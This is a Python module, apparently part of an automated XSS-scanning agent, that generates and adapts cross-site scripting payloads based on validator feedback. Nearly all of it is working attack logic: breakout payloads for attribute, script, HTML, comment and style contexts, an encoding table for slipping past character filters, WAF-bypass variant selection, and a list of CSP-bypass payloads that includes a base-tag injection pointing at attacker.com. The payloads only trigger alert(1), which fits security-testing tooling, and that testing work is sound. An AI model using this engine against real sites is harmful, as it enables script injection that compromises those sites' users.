"""
Pure feedback processing and variant generation for XSS payloads.

Handles validation feedback by generating adapted payload variants
based on observed failure reasons (WAF blocks, context mismatches,
encoding strips, CSP blocks, etc.).

All functions are pure: no I/O, no self, no state mutation.
Functions that were async in the original (because they called LLM)
are left in xss_agent.py. Only the deterministic, pure logic is here.

Extracted from xss_agent.py (lines 8424-8700).
"""

from typing import Dict, List, Optional, Tuple

import logging

logger = logging.getLogger("agents.xss_v4")


# =========================================================================
# Context adaptation helpers (pure)
# =========================================================================

def extract_js_code(payload: str) -> str:
    """
    Extract the JavaScript execution code from an XSS payload.

    Strips common wrapper tags (<script>, <img onerror=...>) to get
    the raw JS expression.

    Args:
        payload: Full XSS payload string.

    Returns:
        The extracted JS code, or 'alert(1)' as fallback.
    """
    js_code = payload
    js_code = js_code.replace('<script>', '').replace('</script>', '')
    js_code = js_code.replace('<img src=x onerror=', '').replace('>', '')
    return js_code if js_code else 'alert(1)'


def adapt_for_attribute(js_code: str) -> str:
    """
    Adapt JS code for injection into an HTML attribute context.

    Args:
        js_code: Raw JavaScript expression.

    Returns:
        Payload crafted to break out of an attribute and execute.
    """
    return f'" onmouseover="{js_code}" autofocus onfocus="{js_code}" x="'


def adapt_for_script(js_code: str) -> str:
    """
    Adapt JS code for injection into a <script> block context.

    Args:
        js_code: Raw JavaScript expression.

    Returns:
        Payload that breaks out of an existing JS string/expression.
    """
    return f"';{js_code};//"


def adapt_for_html(js_code: str) -> str:
    """
    Adapt JS code for injection into an HTML body context.

    Args:
        js_code: Raw JavaScript expression.

    Returns:
        Payload using an <img> onerror handler.
    """
    return f'<img src=x onerror={js_code}>'


def adapt_for_comment(js_code: str) -> str:
    """
    Adapt JS code for injection into an HTML comment context.

    Args:
        js_code: Raw JavaScript expression.

    Returns:
        Payload that closes the comment and injects a script tag.
    """
    return f'--><script>{js_code}</script><!--'


def adapt_for_style(js_code: str) -> str:
    """
    Adapt JS code for injection into a <style> block context.

    Args:
        js_code: Raw JavaScript expression.

    Returns:
        Payload that closes the style tag and injects a script tag.
    """
    return f'</style><script>{js_code}</script><style>'


def adapt_to_context(payload: str, context: Optional[str]) -> str:
    """
    Adapt a payload to the detected HTML context.

    Extracts the JS expression from the payload, then wraps it
    in the appropriate breakout/injection syntax for the given context.

    Args:
        payload: Original XSS payload.
        context: Detected context ('script', 'attribute', 'html',
                 'comment', 'style'). Defaults to 'html' if unknown.

    Returns:
        Payload adapted to the specified context.
    """
    js_code = extract_js_code(payload)

    if context == 'attribute':
        return adapt_for_attribute(js_code)
    if context == 'script':
        return adapt_for_script(js_code)
    if context == 'html':
        return adapt_for_html(js_code)
    if context == 'comment':
        return adapt_for_comment(js_code)
    if context == 'style':
        return adapt_for_style(js_code)

    # Default: safe payload
    return adapt_for_html(js_code)


# =========================================================================
# Character encoding for stripped chars (pure)
# =========================================================================

_ENCODING_OPTIONS: Dict[str, List[str]] = {
    '<': ['&lt;', '\\x3c', '\\u003c', '%3C'],
    '>': ['&gt;', '\\x3e', '\\u003e', '%3E'],
    '"': ['&quot;', '\\x22', '\\u0022', '%22'],
    "'": ['&#39;', '\\x27', '\\u0027', '%27'],
    '(': ['&#40;', '\\x28', '\\u0028', '%28'],
    ')': ['&#41;', '\\x29', '\\u0029', '%29'],
    '/': ['&#47;', '\\x2f', '\\u002f', '%2F'],
    '\\': ['&#92;', '\\x5c', '\\u005c', '%5C'],
    '=': ['&#61;', '\\x3d', '\\u003d', '%3D'],
}


def encode_stripped_chars(payload: str, stripped: List[str]) -> str:
    """
    Encode characters that were filtered/stripped by the server.

    For each stripped character found in the payload, replaces it
    with the first available encoding alternative.

    Args:
        payload: Original payload string.
        stripped: List of individual characters that the server strips.

    Returns:
        Payload with stripped characters replaced by encoded equivalents.
    """
    result = payload

    for char in stripped:
        if char in _ENCODING_OPTIONS:
            # Use the first encoding available
            encoded = _ENCODING_OPTIONS[char][0]
            result = result.replace(char, encoded)

    return result


# =========================================================================
# CSP bypass payload generation (pure)
# =========================================================================

_CSP_BYPASS_PAYLOADS = [
    # Use 'nonce' if available
    '<script nonce="">alert(1)</script>',
    # Base tag injection
    '<base href="https://attacker.com/">',
    # JSONP callback
    '<script src="/api/callback?cb=alert(1)"></script>',
    # Angular sandbox escape
    '{{constructor.constructor("alert(1)")()}}',
    # Trusted Types bypass
    '<div data-trusted="<img src=x onerror=alert(1)>"></div>',
    # Object/embed bypass
    '<object data="javascript:alert(1)">',
]


def generate_csp_bypass_payload() -> str:
    """
    Generate a payload designed to bypass Content Security Policy.

    Returns the first CSP bypass payload from the built-in list.
    A more advanced implementation could rotate or select based on
    the specific CSP directives observed.

    Returns:
        A CSP bypass payload string.
    """
    return _CSP_BYPASS_PAYLOADS[0]


# =========================================================================
# Failure-reason handlers (pure, deterministic)
# =========================================================================

def handle_waf_blocked(
    original: str,
    encoded_variants: List[str],
) -> Tuple[Optional[str], str]:
    """
    Handle a WAF-blocked failure by selecting an encoded variant.

    Args:
        original: The original payload that was blocked.
        encoded_variants: Pre-computed WAF-encoded variants.

    Returns:
        Tuple of (variant_or_None, technique_label).
    """
    for v in encoded_variants:
        if v != original:
            return v, "waf_bypass"
    return None, "waf_bypass"


def handle_context_mismatch(
    original: str,
    detected_context: Optional[str],
) -> Tuple[str, str]:
    """
    Handle a context-mismatch failure by adapting the payload.

    Args:
        original: The original payload.
        detected_context: The actual HTML context detected by the validator.

    Returns:
        Tuple of (adapted_payload, technique_label).
    """
    variant = adapt_to_context(original, detected_context)
    return variant, "context_adaptation"


def handle_encoding_stripped(
    original: str,
    stripped_chars: List[str],
) -> Tuple[str, str]:
    """
    Handle an encoding-stripped failure by re-encoding filtered chars.

    Args:
        original: The original payload.
        stripped_chars: Characters that the server stripped.

    Returns:
        Tuple of (encoded_payload, technique_label).
    """
    variant = encode_stripped_chars(original, stripped_chars)
    return variant, "char_encoding"


def handle_partial_reflection() -> Tuple[str, str]:
    """
    Handle a partial-reflection failure with a simpler payload.

    Returns:
        Tuple of (simple_payload, technique_label).
    """
    return "<img src=x onerror=alert(1)>", "simplification"


def handle_csp_blocked() -> Tuple[Optional[str], str]:
    """
    Handle a CSP-blocked failure with a CSP bypass payload.

    Returns:
        Tuple of (csp_bypass_payload, technique_label).
    """
    variant = generate_csp_bypass_payload()
    return variant, "csp_bypass"


def handle_timing_issue(original: str) -> Tuple[str, str]:
    """
    Handle a timing/DOM-not-ready failure by wrapping in an onload event.

    Args:
        original: The original payload.

    Returns:
        Tuple of (onload_wrapped_payload, technique_label).
    """
    inner = original.replace('<script>', '').replace('</script>', '')
    variant = f'<body onload="{inner}">'
    return variant, "timing_fix"


def generate_variant_for_reason(
    reason: str,
    original_payload: str,
    detected_context: Optional[str] = None,
    stripped_chars: Optional[List[str]] = None,
    encoded_variants: Optional[List[str]] = None,
) -> Tuple[Optional[str], str]:
    """
    Route to the appropriate handler based on the failure reason.

    This is the pure dispatch function. Reasons that require async/LLM
    calls (NO_EXECUTION) are not handled here and return (None, "unknown").

    Args:
        reason: The failure reason string (matching FailureReason enum values).
        original_payload: The payload that failed.
        detected_context: HTML context (for CONTEXT_MISMATCH).
        stripped_chars: Stripped characters (for ENCODING_STRIPPED).
        encoded_variants: Pre-computed WAF variants (for WAF_BLOCKED).

    Returns:
        Tuple of (variant_or_None, technique_label).
    """
    reason_lower = reason.lower() if reason else ""

    if reason_lower == "waf_blocked":
        return handle_waf_blocked(original_payload, encoded_variants or [])

    if reason_lower == "context_mismatch":
        return handle_context_mismatch(original_payload, detected_context)

    if reason_lower == "encoding_stripped":
        return handle_encoding_stripped(original_payload, stripped_chars or [])

    if reason_lower == "partial_reflection":
        return handle_partial_reflection()

    if reason_lower == "csp_blocked":
        return handle_csp_blocked()

    if reason_lower in ("timing_issue", "dom_not_ready"):
        return handle_timing_issue(original_payload)

    # NO_EXECUTION and unknown reasons need LLM -- not pure
    return None, "unknown"


__all__ = [
    "extract_js_code",
    "adapt_for_attribute",
    "adapt_for_script",
    "adapt_for_html",
    "adapt_for_comment",
    "adapt_for_style",
    "adapt_to_context",
    "encode_stripped_chars",
    "generate_csp_bypass_payload",
    "handle_waf_blocked",
    "handle_context_mismatch",
    "handle_encoding_stripped",
    "handle_partial_reflection",
    "handle_csp_blocked",
    "handle_timing_issue",
    "generate_variant_for_reason",
]
